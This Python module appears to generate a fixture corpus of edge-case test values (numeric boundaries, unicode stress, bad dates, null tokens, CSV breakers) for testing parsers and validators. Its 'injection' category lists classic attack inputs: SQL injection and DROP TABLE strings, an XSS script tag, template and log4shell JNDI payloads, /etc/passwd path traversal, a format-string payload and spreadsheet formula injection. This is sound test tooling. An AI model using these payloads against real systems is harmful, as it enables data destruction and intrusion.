"""Edge-case / adversarial corpus generator.

Emits a labeled corpus of the values that break parsers, validators, and
pipelines: integer/float boundaries, empty and whitespace strings, very long
strings, unicode stress (emoji, combining marks, RTL, zero-width, CJK),
injection payloads, extreme/invalid dates, special numbers, and null-like
tokens.

The string payloads are a small curated subset inspired by the MIT-licensed
"Big List of Naughty Strings" — kept inline so the tool stays fully offline
with no bundled megafile.

Schema: edge_id, category, label, value

The corpus is interleaved by category, so even a small ``count`` covers many
categories. When ``count`` exceeds the corpus size the list cycles.
"""

import random

# Each entry: (category, label, value). Value keeps its natural Python type so
# CSV/JSON serialize it as-is. Values that would overflow to inf/NaN (invalid
# JSON) are kept as strings on purpose.
_CASES: list[tuple[str, str, object]] = [
    # --- integer boundaries ---
    ("boundary_int", "zero", 0),
    ("boundary_int", "negative one", -1),
    ("boundary_int", "int32 max", 2147483647),
    ("boundary_int", "int32 min", -2147483648),
    ("boundary_int", "int32 max + 1", 2147483648),
    ("boundary_int", "uint32 max", 4294967295),
    ("boundary_int", "int64 max", 9223372036854775807),
    ("boundary_int", "uint8 max", 255),
    ("boundary_int", "big integer", 100000000000000000000),
    # --- float boundaries ---
    ("boundary_float", "negative zero", -0.0),
    ("boundary_float", "tiny", 1e-308),
    ("boundary_float", "huge", 1e308),
    ("boundary_float", "classic 0.1+0.2", 0.30000000000000004),
    ("boundary_float", "many decimals", 3.141592653589793),
    # --- empty / whitespace ---
    ("empty_ws", "empty string", ""),
    ("empty_ws", "single space", " "),
    ("empty_ws", "many spaces", "     "),
    ("empty_ws", "tab", "\t"),
    ("empty_ws", "newline", "line1\nline2"),
    ("empty_ws", "carriage return", "a\r\nb"),
    # --- long strings ---
    ("long_string", "1k A's", "A" * 1000),
    ("long_string", "long unicode", "🔥" * 200),
    # --- unicode stress ---
    ("unicode", "emoji", "😀🎉🚀"),
    ("unicode", "combining mark", "é"),  # é composed from e + accent
    ("unicode", "zero-width space", "a​b"),
    ("unicode", "rtl arabic", "مرحبا"),
    ("unicode", "cjk", "你好世界"),
    ("unicode", "zwj family", "👨‍👩‍👧‍👦"),
    ("unicode", "math bold", "𝔘𝔫𝔦𝔠𝔬𝔡𝔢"),
    ("unicode", "null byte", "a\x00b"),
    # --- injection / naughty ---
    ("injection", "sql comment", "'; DROP TABLE users;--"),
    ("injection", "sql tautology", "1' OR '1'='1"),
    ("injection", "bobby tables", "Robert'); DROP TABLE Students;--"),
    ("injection", "xss script", "<script>alert(1)</script>"),
    ("injection", "template", "{{7*7}}"),
    ("injection", "log4shell", "${jndi:ldap://example.com/a}"),
    ("injection", "path traversal", "../../../../etc/passwd"),
    ("injection", "format string", "%s%s%s%n"),
    # --- extreme / invalid dates ---
    ("bad_date", "all zeros", "0000-00-00"),
    ("bad_date", "max date", "9999-12-31"),
    ("bad_date", "feb 30", "2021-02-30"),
    ("bad_date", "unix epoch", "1970-01-01"),
    ("bad_date", "2038 problem", "2038-01-19"),
    ("bad_date", "month 13", "2013-13-13"),
    ("bad_date", "ambiguous", "01/02/03"),
    # --- special numbers (as strings; invalid JSON as numbers) ---
    ("special_num", "not a number", "NaN"),
    ("special_num", "infinity", "Infinity"),
    ("special_num", "negative infinity", "-Infinity"),
    ("special_num", "float overflow", "1e400"),
    ("special_num", "leading zeros", "0007"),
    ("special_num", "thousands sep", "1,234,567"),
    # --- null-like tokens ---
    ("null_like", "uppercase NULL", "NULL"),
    ("null_like", "python None", "None"),
    ("null_like", "not available", "N/A"),
    ("null_like", "postgres null", "\\N"),
    ("null_like", "js undefined", "undefined"),
    ("null_like", "nil", "nil"),
    # --- delimiters / quotes (CSV breakers) ---
    ("delimiter", "embedded comma", "Smith, John"),
    ("delimiter", "embedded quote", 'he said "hi"'),
    ("delimiter", "semicolon", "a;b;c"),
    ("delimiter", "pipe", "a|b|c"),
    ("delimiter", "leading equals", "=1+1"),  # spreadsheet formula injection
    ("delimiter", "leading plus", "+SUM(A1)"),
]


def _interleave(cases: list[tuple[str, str, object]]) -> list[tuple[str, str, object]]:
    """Reorder so categories alternate — small counts still span categories."""
    buckets: dict[str, list[tuple[str, str, object]]] = {}
    for case in cases:
        buckets.setdefault(case[0], []).append(case)
    order: list[tuple[str, str, object]] = []
    while any(buckets.values()):
        for cat in list(buckets):
            if buckets[cat]:
                order.append(buckets[cat].pop(0))
    return order


_ORDERED = _interleave(_CASES)


def build_rows(rng: random.Random, count: int = 50) -> list[dict]:
    """Build an edge-case corpus of ``count`` rows (cycles if count exceeds pool).

    Deterministic and independent of ``rng`` — an edge-case corpus should be
    stable regardless of seed so fixtures stay comparable across runs.
    """
    rows = []
    for i in range(count):
        category, label, value = _ORDERED[i % len(_ORDERED)]
        rows.append({
            "edge_id": f"EDGE-{i + 1:04d}",
            "category": category,
            "label": label,
            "value": value,
        })
    return rows
